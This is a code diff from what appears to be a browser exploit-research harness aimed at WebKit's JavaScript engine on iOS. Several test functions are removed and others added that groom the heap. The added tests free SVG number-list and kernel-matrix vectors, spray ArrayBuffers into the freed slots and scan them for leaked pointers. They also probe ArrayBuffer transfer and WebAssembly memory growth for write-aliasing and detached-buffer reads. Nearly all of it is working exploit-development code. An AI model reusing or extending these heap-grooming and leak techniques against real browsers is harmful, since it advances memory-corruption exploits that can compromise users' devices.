-  await raf();
-
-  // Variant B: Replace with a Proxy as the replacer (intercept the call)
-  try{
-    var str2='test 1 2 3 test 4 5 6';
-    var re2=/\d+/g;
-    var callB=0;
-    var proxyFn=new Proxy(function(m){callB++;return m;},{
-      apply:function(fn,thisArg,args){
-        callB++;
-        // On 3rd call, modify the string being searched (not possible from JS, but try)
-        return args[0];
-      }
-    });
-    var res2=str2.replace(re2,proxyFn);
-    log('  RepB: Proxy replacer calls='+callB,'dim');
-  }catch(e){R.rep1.crash=true;log('  RepB EXCEPTION: '+e,'bad');}
-  await raf();
-
-  // Variant C: RegExp with sticky flag + lastIndex mutation during exec
-  try{
-    var bigStr='';for(var i=0;i<1000;i++)bigStr+='test'+i+' ';
-    var reC=/test\d+/y; // sticky
-    var cResults=[];var cLoops=0;
-    reC.lastIndex=0;
-    while(true){
-      var m=reC.exec(bigStr);
-      if(!m)break;
-      cResults.push(m[0]);
-      cLoops++;
-      if(cLoops===50){reC.lastIndex=0;} // reset to start mid-execution
-      if(cLoops>5000)break;
-    }
-    log('  RepC: sticky+lastIndex reset, total matches='+cResults.length+' loops='+cLoops,'dim');
-    if(cLoops>2000){R.rep1.hit=true;log('  RepC: ⚠️ excessive loops!','win');}
-  }catch(e){R.rep1.crash=true;log('  RepC EXCEPTION: '+e,'bad');}
-
-  R.rep1.detail='crash='+R.rep1.crash;
-  log('  REP1: hit='+R.rep1.hit+' crash='+R.rep1.crash,R.rep1.hit?'win':'dim');
-  if(!q)dis(false);
-}
-
-/*
- * WKR1: WeakRef + FinalizationRegistry timing race
- *
- * WeakRef holds a weak reference to an object. If GC collects the object,
- * WeakRef.deref() returns undefined.
- *
- * RACE: In the JSC GC cycle, there's a window between:
- * a) GC marks object as collectable
- * b) FinalizationRegistry runs the cleanup callback
- *
- * During the cleanup callback (FinalizationRegistry), the WeakRef might still
- * return a reference (zombie reference). If we use this zombie reference to
- * access the (now freed/reallocated) JS object, we get a UAF in JSC's heap.
- *
- * Test: create a Float64Array, wrap in WeakRef, force GC to collect it,
- * in the FinalizationRegistry callback try to deref and read values.
- */
-async function runWKR1(q){
-  if(!q){dis(true);sep();log('WKR1: WeakRef race with FinalizationRegistry','inf');sep();}
-
-  if(typeof WeakRef==='undefined'||typeof FinalizationRegistry==='undefined'){
-    log('  WKR1: WeakRef/FinalizationRegistry not available','bad');
-    if(!q)dis(false);return;
-  }
-
-  // Variant A: Float64Array zombie ref
-  var zombieDeref=null;var zombieRead=null;var zombieLen=null;
-  var fr=new FinalizationRegistry(function(val){
-    // Object was GC'd. Try to deref the WeakRef — might get zombie
-    if(wr){
-      var z=wr.deref();
-      zombieDeref=z!==undefined;
-      if(z&&z.length){
-        zombieLen=z.length;
-        try{zombieRead=z[0];}catch(e){zombieRead='threw:'+e;}
-      }
-    }
-    log('  WkrA: FinalizationRegistry fired! zombie_deref='+zombieDeref+' zombie_len='+zombieLen+' zombie_read='+zombieRead,zombieDeref?'win':'dim');
-  });
-
-  var wr;
-  (function(){
-    var ta=new Float64Array(1024);
-    for(var i=0;i<ta.length;i++)ta[i]=i*1.23456789;
-    wr=new WeakRef(ta);
-    fr.register(ta,'float64-target');
-    // ta goes out of scope here
-  })();
-
-  log('  WkrA: WeakRef created, forcing GC...','inf');
-
-  // Force GC
-  for(var gi=0;gi<10;gi++){
-    var g=[];for(var i=0;i<200000;i++)g.push({a:i,b:new Array(4).fill(i)});
-    g=null;await raf();
-  }
-  await sleep(3000);await raf();
-
-  var afterDeref=wr.deref();
-  log('  WkrA: after GC wait: deref()='+(afterDeref===undefined?'undefined (GC\'d)':'still alive'),'dim');
-  log('  WkrA: zombie_deref='+zombieDeref+' zombie_len='+zombieLen+' zombie_read='+zombieRead,'dim');
-
-  if(zombieDeref){
-    R.wkr1.hit=true;
-    log('  WKR1: ✅ zombie ref in FinalizationRegistry callback!','win');
-    if(looksLikePointer(zombieRead)){
-      log('  WKR1: ⚠️ pointer-like zombie read: '+f64bits(zombieRead).hex,'win');
-      R.oob1.leak=f64bits(zombieRead).hex;
-    }
-  }else{
-    log('  WKR1: no zombie (WeakRef cleared before FinalizationRegistry callback)','dim');
-  }
-
-  if(!q)dis(false);
-}
-
-/*
- * ANI1: SVG SMIL animation allocator race
- *
- * SVG SMIL animations (the <animate> element) drive animVal updates.
- * animVal is a SEPARATE SVGNumber from baseVal.
- * During animation, WebKit repeatedly updates animVal's m_value.
- *
- * KEY QUESTION: Does animVal share IsoHeap<SVGNumber> with baseVal?
- * If YES: animating fast might cause SVGNumber alloc/free patterns that
- *         allow freelist access in the animation update path (different code path
- *         than the JS-triggered allocation path, might not be Spectre-hardened).
- * If NO: animVal uses a different storage mechanism entirely.
- *
- * Test: Create SVG animation, read animVal during animation frame,
- * check if animVal SVGNumbers are reachable via baseVal dangling refs
- * (confirming shared IsoHeap).
- */
-async function runANI1(q){
-  if(!q){dis(true);sep();log('ANI1: SVG SMIL animVal groom test','inf');sep();}
+async function runVEC1(q){
+  if(!q){dis(true);sep();log('VEC1: SVGLengthList vector backing store groom','inf');sep();}
 
   var svgNS='http://www.w3.org/2000/svg';
 
-  // Create feColorMatrix with animation
-  var svg=document.createElementNS(svgNS,'svg');
-  svg.setAttribute('width','1');svg.setAttribute('height','1');
-  svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
-  svg.setAttribute('xmlns',svgNS);
+  // Setup: SVG with text element
+  var svgEl=document.createElementNS(svgNS,'svg');
+  svgEl.setAttribute('width','1');svgEl.setAttribute('height','1');
+  svgEl.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+  var textEl=document.createElementNS(svgNS,'text');
+  textEl.setAttribute('dx','10 20 30'); // 3 SVGLength items → 3×8=24 byte vector
+  svgEl.appendChild(textEl);
+  document.body.appendChild(svgEl);
+  await raf();
 
-  var defs=document.createElementNS(svgNS,'defs');
-  var filt=document.createElementNS(svgNS,'filter');filt.setAttribute('id','anim_filt');
-  var fcm=document.createElementNS(svgNS,'feColorMatrix');
-  fcm.setAttribute('type','matrix');
-  fcm.setAttribute('values','1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 1 0');
-
-  // Add SMIL animation
-  var anim=document.createElementNS(svgNS,'animate');
-  anim.setAttribute('attributeName','values');
-  anim.setAttribute('from','1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 1 0');
-  anim.setAttribute('to','0 1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 1');
-  anim.setAttribute('dur','0.5s');
-  anim.setAttribute('repeatCount','indefinite');
-
-  fcm.appendChild(anim);filt.appendChild(fcm);defs.appendChild(filt);svg.appendChild(defs);
-  document.body.appendChild(svg);
-  await raf();await raf();
-
-  // Read animVal and baseVal
-  var animAvail=false;var animVals=[];var baseVals=[];
   try{
-    if(fcm.values&&fcm.values.animVal){
-      animAvail=true;
-      for(var i=0;i<20;i++)animVals.push(fcm.values.animVal[i]?fcm.values.animVal[i].value:null);
-      for(var i=0;i<20;i++)baseVals.push(fcm.values.baseVal[i]?fcm.values.baseVal[i].value:null);
+    // Verify we can access dx.baseVal
+    var dl=textEl.dx&&textEl.dx.baseVal;
+    log('  VEC1: text.dx.baseVal available='+(dl!=null)+' length='+(dl?dl.numberOfItems||dl.length:'n/a'),'dim');
+
+    // Build a spray of ArrayBuffers at various sizes to catch the freed slot
+    var SIZES=[24,32,40,48,56,64,72,80,96,112,128,160,192,256];
+    var sprays={};
+
+    // Phase 1: baseline — allocate reference ArrayBuffers to "warm up" the allocator
+    var warm=[];for(var i=0;i<64;i++)warm.push(new ArrayBuffer(24));
+    // Free some to create freelist entries
+    warm.splice(0,32); // release 32 of them back
+    await raf();
+
+    // Phase 2: Force vector reallocation
+    // Change dx from 3 items to 20 items → vector grows → old 3×8=24 byte block freed
+    var growStr='';for(var i=0;i<20;i++)growStr+=(i*5)+' ';
+    textEl.setAttribute('dx',growStr.trim());
+    await raf(); // let the DOM update process
+
+    // Phase 3: IMMEDIATELY spray ArrayBuffer(24) to catch the freed 24-byte vector slot
+    var spray24=[];for(var i=0;i<512;i++)spray24.push(new ArrayBuffer(24));
+    await raf();
+
+    // Also spray size 160 (20-item vector = 20×8=160 bytes)
+    // Now change dx back to 3 items: 20-item vector freed, 3-item vector reallocated
+    textEl.setAttribute('dx','1 2 3');
+    await raf();
+    var spray160=[];for(var i=0;i<512;i++)spray160.push(new ArrayBuffer(160));
+    await raf();
+
+    // Now try 20 items again → old 3-item vector freed (24 bytes)
+    textEl.setAttribute('dx',growStr.trim());
+    await raf();
+    var spray24b=[];for(var i=0;i<512;i++)spray24b.push(new ArrayBuffer(24));
+    await raf();
+
+    // Scan all sprayed ArrayBuffers for pointer-like values
+    log('  VEC1: scanning 512 × 24-byte ArrayBuffers (first grow)...','dim');
+    var allPtrs=[];
+    for(var i=0;i<spray24.length;i++){
+      var f64=new Float64Array(spray24[i]);
+      for(var j=0;j<f64.length;j++){
+        if(looksLikePtr(f64[j])){
+          var b=f64bits(f64[j]);
+          allPtrs.push({buf:'spray24['+i+']['+j+']',hex:b.hex});
+        }
+      }
     }
-  }catch(e){log('  ANI1: animVal access threw: '+e,'bad');}
-
-  log('  ANI1: animVal available='+animAvail,'dim');
-  if(animAvail){
-    log('  baseVal[0..4]='+baseVals.slice(0,5).join(','),'dim');
-    log('  animVal[0..4]='+animVals.slice(0,5).join(','),'dim');
-
-    // Get baseVal ref, free parent, check if animVal ref still works
-    var bvRef=null;
-    try{bvRef=fcm.values.baseVal[0];}catch(e){}
-
-    // Collect animVal refs
-    var avRefs=[];
-    try{for(var i=0;i<20;i++)avRefs.push(fcm.values.animVal[i]);}catch(e){}
-
-    // Now remove the SVG (free the C++ objects)
-    svg.parentNode.removeChild(svg);
-    await raf();await raf();
-
-    // Try writing via baseVal ref (UAF to animVal territory?)
-    var TAG_ANI=8888888.0;
-    if(bvRef)try{bvRef.value=TAG_ANI;}catch(e){}
-
-    // Read animVal refs (dangling)
-    var avReads=[];
-    for(var i=0;i<avRefs.length;i++){
-      try{avReads.push(avRefs[i]?avRefs[i].value:null);}catch(e){avReads.push('threw');}
+    log('  VEC1: scanning 512 × 160-byte ArrayBuffers (20→3 shrink)...','dim');
+    for(var i=0;i<spray160.length;i++){
+      var f64=new Float64Array(spray160[i]);
+      for(var j=0;j<f64.length;j++){
+        if(looksLikePtr(f64[j])){
+          var b=f64bits(f64[j]);
+          allPtrs.push({buf:'spray160['+i+']['+j+']',hex:b.hex});
+        }
+      }
     }
-    log('  animVal reads after free: '+avReads.slice(0,10).join(','),'dim');
+    log('  VEC1: scanning 512 × 24-byte ArrayBuffers (second grow)...','dim');
+    for(var i=0;i<spray24b.length;i++){
+      var f64=new Float64Array(spray24b[i]);
+      for(var j=0;j<f64.length;j++){
+        if(looksLikePtr(f64[j])){
+          var b=f64bits(f64[j]);
+          allPtrs.push({buf:'spray24b['+i+']['+j+']',hex:b.hex});
+        }
+      }
+    }
 
-    var animHit=avReads.some(function(v){return typeof v==='number'&&Math.abs(v-TAG_ANI)<0.5;});
-    if(animHit){
-      R.ani1.hit=true;log('  ANI1: ✅ animVal/baseVal share IsoHeap slot!','win');
+    log('  VEC1: total pointer-like values found: '+allPtrs.length,'dim');
+    if(allPtrs.length>0){
+      R.vec1.hit=true;
+      R.vec1.ptrs=allPtrs;
+      for(var i=0;i<Math.min(10,allPtrs.length);i++){
+        log('  ★ LEAK: '+allPtrs[i].buf+' = '+allPtrs[i].hex,'win');
+      }
     }else{
-      log('  ANI1: animVal/baseVal appear isolated (or SMIL not running)','dim');
+      log('  VEC1: no pointer leaks (allocator not landing on freed vector slots)','dim');
     }
 
-    R.ani1.detail='animAvail='+animAvail+' smil_active='+(animVals[0]!==baseVals[0]);
-    log('  baseVal==animVal: '+(JSON.stringify(baseVals)===JSON.stringify(animVals))+' (if false: animation running)','dim');
-  }else{
-    R.ani1.detail='animVal not accessible (SMIL disabled?)';
-    log('  ANI1: SMIL may be disabled in WKWebView on iOS 26','dim');
-    svg.parentNode&&svg.parentNode.removeChild(svg);
+    // Cleanup
+    warm=null;spray24=null;spray160=null;spray24b=null;
+  }catch(e){log('  VEC1 EXCEPTION: '+e,'bad');}
+
+  svgEl.parentNode&&svgEl.parentNode.removeChild(svgEl);
+  R.vec1.detail='hit='+R.vec1.hit+' ptrs='+R.vec1.ptrs.length;
+  log('  VEC1: hit='+R.vec1.hit+' ptrs_found='+R.vec1.ptrs.length,R.vec1.hit?'win':'dim');
+  if(!q)dis(false);
+}
+
+/*
+ * VEC2: feColorMatrix type-change groom
+ *
+ * feColorMatrix type=matrix → type=saturate:
+ * - matrix: 20 SVGNumbers in list → vector = 20×8 = 160 bytes
+ * - saturate: 1 SVGNumber in list → vector = 1×8 = 8 bytes (or reallocated)
+ *
+ * When type changes, SVGFEColorMatrixElement::syncAttribute() is called,
+ * which calls SVGNumberList::setSingleItem() or clears and rebuilds the list.
+ * The old 160-byte vector backing store MIGHT be freed to WTF::fastMalloc.
+ *
+ * PLAN:
+ * 1. Keep feColorMatrix in DOM (don't remove)
+ * 2. Get ref to fcm.values.baseVal (live SVGNumberList)
+ * 3. Get all 20 individual refs (fcm.values.baseVal[i])
+ * 4. Change type to saturate → list truncates → old vector freed
+ * 5. Spray ArrayBuffer(160) to catch freed vector slot
+ * 6. Check ArrayBuffer for pointer-like values
+ * 7. Those pointers = addresses of Ref<SVGNumber> entries in the old vector
+ *    = addresses of SVGNumber objects in IsoHeap<SVGNumber>!
+ */
+async function runVEC2(q){
+  if(!q){dis(true);sep();log('VEC2: feColorMatrix type-change vector groom','inf');sep();}
+
+  var TAG_V2=5551234.0; // recognizable float to write into SVGNumber m_value
+
+  var d=makeFCM(identity20());
+  await raf();
+
+  try{
+    // Get ALL 20 refs while type=matrix
+    var refs=[];
+    for(var i=0;i<20;i++)refs.push(d.fcm.values.baseVal[i]);
+    log('  VEC2: got 20 refs to baseVal items','dim');
+
+    // Write recognizable values to all 20 SVGNumbers so we can identify their addresses
+    for(var i=0;i<20;i++){
+      try{refs[i].value=10000+i;} // values 10000, 10001, ..., 10019
+      catch(e){}
+    }
+
+    // Warm up: alloc + free some 160-byte buffers to prime the freelist
+    var warm=[];for(var i=0;i<32;i++)warm.push(new ArrayBuffer(160));
+    warm.splice(0,16); // free 16 of them
+    await raf();
+
+    // TRIGGER: change type from matrix (20 values) to saturate (1 value)
+    // This should free the 160-byte vector backing store for the 20-item list
+    d.fcm.setAttribute('type','saturate');
+    d.fcm.setAttribute('values','0.5'); // saturate needs 1 value
+    await raf();
+
+    // Immediate spray: ArrayBuffer(160) to catch the freed slot
+    var spray=[];
+    for(var i=0;i<2048;i++)spray.push(new ArrayBuffer(160));
+    await raf();
+
+    // Also try nearby sizes: 128, 192
+    var spray2=[];
+    for(var i=0;i<512;i++){spray2.push(new ArrayBuffer(128));spray2.push(new ArrayBuffer(192));}
+    await raf();
+
+    // Scan sprayed buffers for pointer-like values
+    log('  VEC2: scanning '+spray.length+' × 160-byte ArrayBuffers...','dim');
+    var allPtrs=[];
+    for(var i=0;i<spray.length;i++){
+      var f64=new Float64Array(spray[i]);
+      for(var j=0;j<f64.length;j++){
+        if(looksLikePtr(f64[j])){
+          var b=f64bits(f64[j]);
+          allPtrs.push({buf:'s['+i+']['+j+']',hex:b.hex,val:f64[j]});
+        }
+      }
+    }
+
+    log('  VEC2: pointer leaks found: '+allPtrs.length,'dim');
+    if(allPtrs.length>0){
+      R.vec2.hit=true;R.vec2.ptrs=allPtrs;
+      for(var i=0;i<Math.min(10,allPtrs.length);i++){
+        log('  ★ LEAK: '+allPtrs[i].buf+' = '+allPtrs[i].hex,'win');
+      }
+      log('  VEC2: these ptrs should be addresses of Ref<SVGNumber> in freed vector','win');
+      log('  VEC2: i.e., pointers to live SVGNumber objects in IsoHeap<SVGNumber>!','win');
+    }
+
+    // Also: change back to matrix (1→20 values) to see if it reallocates differently
+    d.fcm.setAttribute('type','matrix');
+    d.fcm.setAttribute('values',identity20().join(' '));
+    await raf();
+
+    // After second type change: read the refs[0-19] if they survived
+    var readback=[];
+    for(var i=0;i<20;i++){
+      try{readback.push(refs[i]?refs[i].value:null);}
+      catch(e){readback.push('threw');}
+    }
+    log('  VEC2: readback after matrix restore: '+readback.slice(0,5).join(',')+'...','dim');
+    log('  VEC2: (if 10000-10019 range: still points to live SVGNumbers)','dim');
+    log('  VEC2: (if 1/0: fresh identity, type-change rebuilt the list)','dim');
+
+    warm=null;spray=null;spray2=null;
+  }catch(e){log('  VEC2 EXCEPTION: '+e,'bad');}
+
+  cleanupD(d);
+  R.vec2.detail='ptrs='+R.vec2.ptrs.length;
+  log('  VEC2: hit='+R.vec2.hit+' ptrs_found='+R.vec2.ptrs.length,R.vec2.hit?'win':'dim');
+  if(!q)dis(false);
+}
+
+/*
+ * VEC3: feConvolveMatrix kernelMatrix size mutation groom
+ *
+ * feConvolveMatrix has a kernelMatrix attribute (SVGAnimatedNumberList).
+ * Its size = kernelSizeX * kernelSizeY.
+ *
+ * Changing kernelSize from A×B to C×D with C*D > A*B should grow the vector.
+ * Old vector backing store freed to WTF::fastMalloc.
+ *
+ * Useful because:
+ * 1. Can control EXACT vector sizes (1×1=1, 2×2=4, 3×3=9, 4×4=16, 5×5=25...)
+ * 2. Larger sizes give more pointer data to read
+ */
+async function runVEC3(q){
+  if(!q){dis(true);sep();log('VEC3: feConvolveMatrix kernelMatrix groom','inf');sep();}
+
+  var svgNS='http://www.w3.org/2000/svg';
+
+  var svgEl=document.createElementNS(svgNS,'svg');
+  svgEl.setAttribute('width','2');svgEl.setAttribute('height','2');
+  svgEl.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+  var defs=document.createElementNS(svgNS,'defs');
+  var filt=document.createElementNS(svgNS,'filter');filt.setAttribute('id','vcfilt');
+
+  var fcv=document.createElementNS(svgNS,'feConvolveMatrix');
+  fcv.setAttribute('kernelSize','3 3'); // 3×3=9 items → 72 bytes
+  var k9=[];for(var i=0;i<9;i++)k9.push(i+1);
+  fcv.setAttribute('kernel',k9.join(' '));
+  fcv.setAttribute('divisor','1');
+
+  filt.appendChild(fcv);defs.appendChild(filt);svgEl.appendChild(defs);
+  document.body.appendChild(svgEl);
+  await raf();
+
+  try{
+    // Check kernelMatrix accessibility
+    var km=fcv.kernelMatrix;
+    log('  VEC3: kernelMatrix available='+(km!=null),'dim');
+    log('  VEC3: initial kernelMatrix.baseVal.length='+(km&&km.baseVal?km.baseVal.numberOfItems||km.baseVal.length:'n/a'),'dim');
+
+    // Test sequence: 3×3→5×5→3×3→5×5 to trigger repeated reallocs
+    var prevSize=9;
+
+    for(var round=0;round<3;round++){
+      // Grow: 3×3→5×5 (9→25 items, 72→200 bytes freed)
+      fcv.setAttribute('kernelSize','5 5');
+      var k25=[];for(var i=0;i<25;i++)k25.push(i+1);
+      fcv.setAttribute('kernel',k25.join(' '));
+      await raf();
+
+      // Spray ArrayBuffer(72) to catch freed 72-byte (9-item) slot
+      var spray72=[];for(var i=0;i<512;i++)spray72.push(new ArrayBuffer(72));
+      await raf();
+
+      // Shrink back: 5×5→3×3 (200-byte block freed)
+      fcv.setAttribute('kernelSize','3 3');
+      fcv.setAttribute('kernel',k9.join(' '));
+      await raf();
+
+      // Spray ArrayBuffer(200) to catch freed 200-byte (25-item) slot
+      var spray200=[];for(var i=0;i<512;i++)spray200.push(new ArrayBuffer(200));
+      await raf();
+
+      // Scan
+      var round_ptrs=0;
+      for(var i=0;i<spray72.length;i++){
+        var f64=new Float64Array(spray72[i]);
+        for(var j=0;j<f64.length;j++){
+          if(looksLikePtr(f64[j])){round_ptrs++;
+            if(!R.vec3.hit){R.vec3.hit=true;log('  ★ VEC3[72] ptr: '+f64bits(f64[j]).hex,'win');}
+          }
+        }
+      }
+      for(var i=0;i<spray200.length;i++){
+        var f64=new Float64Array(spray200[i]);
+        for(var j=0;j<f64.length;j++){
+          if(looksLikePtr(f64[j])){round_ptrs++;
+            if(R.vec3.hit||true){
+              R.vec3.hit=true;
+              if(R.vec3.ptrs.length<5)R.vec3.ptrs.push(f64bits(f64[j]).hex);
+              if(R.vec3.ptrs.length===1)log('  ★ VEC3[200] ptr: '+f64bits(f64[j]).hex,'win');
+            }
+          }
+        }
+      }
+      log('  VEC3: round '+round+' ptrs found: '+round_ptrs,'dim');
+      spray72=null;spray200=null;
+      await raf();
+    }
+
+  }catch(e){log('  VEC3 EXCEPTION: '+e,'bad');}
+
+  svgEl.parentNode&&svgEl.parentNode.removeChild(svgEl);
+  R.vec3.detail='hit='+R.vec3.hit+' ptrs='+R.vec3.ptrs.length;
+  log('  VEC3: hit='+R.vec3.hit,R.vec3.hit?'win':'dim');
+  if(!q)dis(false);
+}
+
+/*
+ * TRN1: Transfer write-destination test (SET1-A follow-up)
+ *
+ * In v43 SET1-A: ta.set(srcA) DID NOT THROW after buf.transfer() was called.
+ * We didn't capture the returned buffer from transfer().
+ *
+ * Now: capture newBuf = buf.transfer(). After ta.set() completes,
+ * read newBuf to see what values were written to it.
+ *
+ * Expected behavior:
+ * - Elements 0..9 (before detach trigger): written to old buf (now newBuf's memory)
+ * - Elements 11..511 (after detach): either thrown (not happening per v43) or still writing
+ *
+ * If elements 11..511 appear in newBuf → confirms post-detach set() writes to transferred memory
+ * This is a write-aliasing primitive: ta.set() after transfer writes to newBuf!
+ */
+async function runTRN1(q){
+  if(!q){dis(true);sep();log('TRN1: Transfer write-destination (SET1-A follow-up)','inf');sep();}
+
+  try{
+    var N=512; // Float64 elements = 4096 bytes
+    var buf=new ArrayBuffer(N*8);
+    var ta=new Float64Array(buf);
+
+    // Fill ta with initial pattern
+    for(var i=0;i<N;i++)ta[i]=1000+i; // 1000,1001,...,1511
+
+    // Source array with getter at index TRIG that calls buf.transfer()
+    var srcA=[];for(var i=0;i<N;i++)srcA.push(i*2.5); // source values: 0, 2.5, 5, ...
+    var TRIG=50; // trigger at element 50
+    var newBuf=null;var trigFired=false;
+    Object.defineProperty(srcA,TRIG,{get:function(){
+      if(!trigFired){trigFired=true;newBuf=buf.transfer();}
+      return TRIG*2.5;
+    },configurable:true});
+
+    log('  TRN1: ta initial[0..3]='+Array.from(ta.slice(0,4)).join(','),'dim');
+    log('  TRN1: srcA[0..3]='+[0,2.5,5,7.5].join(','),'dim');
+    log('  TRN1: transfer trigger at element '+TRIG,'dim');
+
+    try{ta.set(srcA);}catch(e2){log('  TRN1: ta.set threw: '+e2,'inf');}
+
+    log('  TRN1: trigFired='+trigFired,'dim');
+    log('  TRN1: newBuf='+( newBuf?'exists, byteLength='+newBuf.byteLength:'null' ),'dim');
+    log('  TRN1: ta.byteLength after set: '+ta.byteLength,'dim');
+
+    if(newBuf&&newBuf.byteLength>0){
+      var newTA=new Float64Array(newBuf);
+      log('  TRN1: newTA.length='+newTA.length,'dim');
+
+      // Check elements before trigger (0..TRIG-1): should be srcA values (i*2.5)
+      var preTrigCorrect=0;
+      for(var i=0;i<TRIG;i++){
+        if(Math.abs(newTA[i]-i*2.5)<0.001)preTrigCorrect++;
+      }
+      log('  TRN1: pre-trigger elements matching srcA: '+preTrigCorrect+'/'+TRIG,'dim');
+
+      // Check elements AFTER trigger (TRIG+1..N-1): did post-detach writes reach here?
+      var postTrigSet=0;
+      for(var i=TRIG+1;i<N;i++){
+        if(Math.abs(newTA[i]-i*2.5)<0.001)postTrigSet++; // srcA value
+      }
+      var postTrigOld=0;
+      for(var i=TRIG+1;i<N;i++){
+        if(Math.abs(newTA[i]-(1000+i))<0.001)postTrigOld++; // original ta value
+      }
+      log('  TRN1: post-trigger elements = srcA values (set wrote there): '+postTrigSet+'/'+(N-TRIG-1),'dim');
+      log('  TRN1: post-trigger elements = original ta values (not written): '+postTrigOld+'/'+(N-TRIG-1),'dim');
+
+      if(postTrigSet>0){
+        R.trn1.writeConfirmed=true;R.trn1.hit=true;
+        log('  TRN1: ✅ POST-DETACH SET() WROTE TO TRANSFERRED BUFFER!','win');
+        log('  TRN1: ta.set() continued writing '+(N-TRIG-1)+' more elements after buf.transfer()','win');
+        log('  TRN1: This is a write-aliasing primitive between detached ta and newBuf!','win');
+      }
+
+      // Scan newTA for pointer-like values
+      var ptrHits=[];
+      for(var i=0;i<newTA.length;i++){
+        if(looksLikePtr(newTA[i]))ptrHits.push({idx:i,hex:f64bits(newTA[i]).hex});
+      }
+      if(ptrHits.length>0){
+        log('  TRN1: ★ POINTER-LIKE VALUES in newTA: '+ptrHits.length,'win');
+        for(var i=0;i<Math.min(3,ptrHits.length);i++)log('    ['+ptrHits[i].idx+']='+ptrHits[i].hex,'win');
+      }
+    }
+  }catch(e){log('  TRN1 EXCEPTION: '+e,'bad');}
+
+  R.trn1.detail='trigFired='+R.trn1.writeConfirmed;
+  log('  TRN1: writeConfirmed='+R.trn1.writeConfirmed,R.trn1.hit?'win':'dim');
+  if(!q)dis(false);
+}
+
+/*
+ * WAS1: WebAssembly memory.grow() TypedArray invalidation
+ *
+ * Wasm.Memory.grow(pages) DETACHES the old ArrayBuffer and creates a new one.
+ * If we have a Float64Array view into the old buffer and call grow(),
+ * the view should become detached. Does JSC handle this correctly?
+ *
+ * Also: BEFORE grow, read memory.buffer. AFTER grow, it returns a new buffer.
+ * If we kept a TypedArray into the OLD buffer, accessing it should throw.
+ * But maybe JSC doesn't invalidate in-flight operations.
+ */
+async function runWAS1(q){
+  if(!q){dis(true);sep();log('WAS1: WebAssembly memory.grow() race','inf');sep();}
+
+  if(typeof WebAssembly==='undefined'){
+    log('  WAS1: WebAssembly not available','bad');
+    if(!q)dis(false);return;
   }
 
-  if(!q)dis(false);
-}
-
-/*
- * LEN1: Array.from length confusion
- *
- * Array.from(arrayLike) reads arrayLike.length to determine how many elements to copy.
- * If length is accessed via a getter that changes the actual backing data between
- * the length read and the element copy loop, JSC might copy from wrong indices.
- *
- * Also test: new Array(bigNum) then filling via .fill() → should be safe,
- * but combined with TypedArray view confusion...
- */
-async function runLEN1(q){
-  if(!q){dis(true);sep();log('LEN1: Array.from length confusion','inf');sep();}
-
-  // Variant A: arrayLike with getter that inflates length
   try{
-    var realData=new Float64Array(10);for(var i=0;i<10;i++)realData[i]=i*1.1;
-    var fake={
-      get length(){return 1000000;}, // lie! real data only has 10 elements
-    };
-    for(var i=0;i<10;i++)fake[i]=realData[i];
+    // Create minimal wasm module that exports a memory.grow function
+    // (i32.const 1) (memory.grow) (drop) → grow memory by 1 page
+    // Wasm binary: [magic][version][mem section][export section][code section]
+    var wasmBytes=new Uint8Array([
+      0x00,0x61,0x73,0x6d, // magic
+      0x01,0x00,0x00,0x00, // version
+      // Memory section: 1 memory, min 1 page, no max
+      0x05,0x03,0x01,0x00,0x01,
+      // Export section: export "memory"
+      0x07,0x0a,0x01,0x06,0x6d,0x65,0x6d,0x6f,0x72,0x79,0x02,0x00,
+      // Function type section: () → ()
+      0x01,0x04,0x01,0x60,0x00,0x00,
+      // Function section: 1 function, type 0
+      0x03,0x02,0x01,0x00,
+      // Export func: export "grow_mem"
+      0x07,0x10,0x02,0x06,0x6d,0x65,0x6d,0x6f,0x72,0x79,0x02,0x00,
+             0x08,0x67,0x72,0x6f,0x77,0x5f,0x6d,0x65,0x6d,0x00,0x00,
+      // Code section: function body
+      0x0a,0x08,0x01,0x06,0x00,0x41,0x01,0x40,0x00,0x1a,0x0b
+    ]);
+    // Simpler approach: use WebAssembly.Memory directly
+    var mem=new WebAssembly.Memory({initial:1}); // 1 page = 64KB
+    var oldBuf=mem.buffer;
+    var oldTA=new Float64Array(oldBuf);
 
-    // Array.from should try to read 1000000 elements but only 10 exist
-    var result=[];var startT=Date.now();
+    // Write known values to old buffer
+    for(var i=0;i<1024;i++)oldTA[i]=i*7.77;
+    log('  WAS1: mem.buffer.byteLength='+oldBuf.byteLength,'dim');
+    log('  WAS1: oldTA[0]='+oldTA[0]+' oldTA[1023]='+oldTA[1023],'dim');
+
+    // GROW: this detaches oldBuf
+    mem.grow(1);
+    await raf();
+
+    var newBuf=mem.buffer;
+    log('  WAS1: after grow: mem.buffer.byteLength='+newBuf.byteLength,'dim');
+    log('  WAS1: oldBuf.byteLength after grow='+oldBuf.byteLength,'dim');
+    log('  WAS1: oldBuf === mem.buffer: '+(oldBuf===newBuf),'dim');
+
+    // Try to access oldTA after grow (should be detached)
     try{
-      // Don't actually do 1M elements — just test that Array.from handles the fake length
-      // Use a Proxy to intercept at a safe limit
-      var proxyFake=new Proxy(fake,{
-        get:function(t,p){
-          if(p==='length')return 50; // safe limit for this test
-          var idx=parseInt(p);
-          if(idx>=0&&idx<10)return realData[idx];
-          if(idx>=10)return idx*9999.9; // OOB territory — fake values
-          return t[p];
-        }
-      });
-      result=Array.from(proxyFake);
-      log('  LenA: Array.from(50-len proxy with 10 real elems): result.length='+result.length,'dim');
-      var aLeaks=checkForLeaks(result,'LenA');
-      if(aLeaks.length>0)R.len1.hit=true;
-    }catch(e2){log('  LenA: threw: '+e2,'inf');}
-  }catch(e){R.len1.crash=true;log('  LenA EXCEPTION: '+e,'bad');}
-  await raf();
+      var readAfterGrow=oldTA[0];
+      log('  WAS1: oldTA[0] after grow='+readAfterGrow+' (ALIVE AFTER GROW!)',looksLikePtr(readAfterGrow)?'win':'crit');
+      if(looksLikePtr(readAfterGrow)){
+        R.was1.hit=true;
+        log('  WAS1: ★ POINTER-LIKE VALUE from detached wasm buffer!','win');
+      }
+    }catch(e2){
+      log('  WAS1: oldTA access after grow threw: '+e2+' (expected)','dim');
+    }
 
-  // Variant B: Spread from an Array-like with getter traps
-  try{
-    var counterB=0;
-    var trickB={
-      get length(){counterB++;if(counterB===1)return 100;return 3;},
